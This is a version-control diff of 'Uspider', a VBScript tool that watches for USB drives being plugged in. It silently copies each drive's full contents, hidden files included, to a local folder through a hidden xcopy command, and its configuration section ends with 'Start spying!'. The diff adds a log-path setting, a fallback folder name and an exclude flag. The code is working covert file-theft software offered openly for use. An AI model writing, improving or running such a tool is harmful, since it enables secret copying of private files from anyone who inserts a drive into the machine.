@@ -1,4 +1,4 @@
-' Uspider v2.0.0.alpha by codgician
+' Uspider v2.0.0 by codgician
 ' ====================================
 ' The brand new Uspider, more classy than ever.
 ' With great might comes great responsibility. DO NOT BE EVIL.
@@ -7,11 +7,15 @@
 
 Class Uspider
     Private objFileSystem, objWMIService, objWScriptShell, colEvents
-    Private bool_logging, string_destFolder, bool_separateFolders, string_xcopyParameters, bool_isBlackList, string_customList
+    Private bool_logging, string_logDir, string_destFolder, bool_separateFolders, string_xcopyParameters, bool_isBlackList, string_customList
     
     ' Get parameters.
     Public Property Let logging(logOpt)
         bool_logging = logOpt
+    End Property
+	
+	Public Property Let logDir(logDirOpt)
+        string_logDir = logDirOpt
     End Property
  
     Public Property Let destFolder(destFolderOpt)
@@ -61,10 +65,10 @@ Class Uspider
             log "Custom List Found! isIncluded = " & isIncluded
 
              If isIncluded = bool_isBlackList Then
-                log "Files on this device will be copied..."
+                log "Initialize copying..."
                 checkList = true
             Else
-                log "Files on this device will not be copied..."
+                log "Skip copying..."
                 checkList = false
             End If
         Else
@@ -81,7 +85,13 @@ Class Uspider
         
         ' Initialize Work Folder.
         If bool_separateFolders = true Then
-            workFolder = destDir + "\" + objTargetDevice.VolumeSerialNumber
+			subFolder = objTargetDevice.VolumeSerialNumber
+			
+			If IsEmpty(subFolder) = true Then
+				subFolder = "UNKNOWN"
+			End If
+			
+            workFolder = destDir + "\" + subFolder
         Else
             workFolder = destDir
         End If
@@ -90,6 +100,7 @@ Class Uspider
             objFileSystem.CreateFolder workFolder
         End If
         
+		' Execute copying.
         copyCommand = "cmd.exe /c xcopy " + objTargetDevice.DeviceId + "\* " + workFolder + " " + string_xcopyParameters
         objWScriptShell.Run(copyCommand), 0, false
         
@@ -103,12 +114,12 @@ Class Uspider
         End If
         
         ' Initialize bool_logging.
-        If objFileSystem.FileExists("Uspider_log.txt") = false Then
-            Set objLogFile = objFileSystem.CreateTextFile("Uspider_log.txt")
+       If objFileSystem.FileExists(string_logDir) <> true  Then
+            Set objLogFile = objFileSystem.CreateTextFile(string_logDir)			
             objLogFile.Close
         End If
         
-        Set objLogFile = objFileSystem.OpenTextFile("Uspider_log.txt", 8, True)
+        Set objLogFile = objFileSystem.OpenTextFile(string_logDir, 8, True)
         
         objLogFile.Write("[" & Now & "] " & logText) & vbcrlf
         
@@ -159,9 +170,10 @@ Set Spider = New Uspider
 Spider.logging = true
 Spider.destFolder = "D:\Uspider"
 Spider.separateFolders = true
-Spider.xcopyParameters = "/d /e /r /y /h"
-Spider.isBlackList = false
+Spider.xcopyParameters = "/d /e /r /y /h /EXCLUDE:~$"
+Spider.isBlackList = false  ' Blacklist: Files from drives inside the list will be copied.
 Spider.customList = ""
+Spider.logDir = "D:\Uspider_log.txt"
 
 ' Start spying!
 Spider.Init()
